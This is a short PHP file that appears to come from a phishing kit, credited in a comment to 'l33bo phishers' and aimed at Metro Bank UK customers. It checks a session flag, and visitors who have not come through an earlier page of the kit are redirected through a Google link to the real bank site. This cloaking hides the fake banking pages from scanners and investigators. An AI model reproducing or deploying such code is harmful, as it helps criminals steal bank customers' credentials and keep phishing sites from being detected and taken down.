<?php
# l33bo phishers
session_start();
if(!isset($_SESSION['page_a_visited'])){
        header("Location: https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=2&cad=rja&uact=8&ved=0ahUKEwi59I_Ft-3KAhVGfw8KHQ6vDz4QjBAIKTAB&url=https%3A%2F%2Fwww.metrobankonline.co.uk%2Fpersonal%2F&usg=AFQjCNHd9Udh84A59-gG2POM7M4GRv6GOA&sig2=0BYCwRiAACnx4bPmjqzCuA");
		die();
}
?>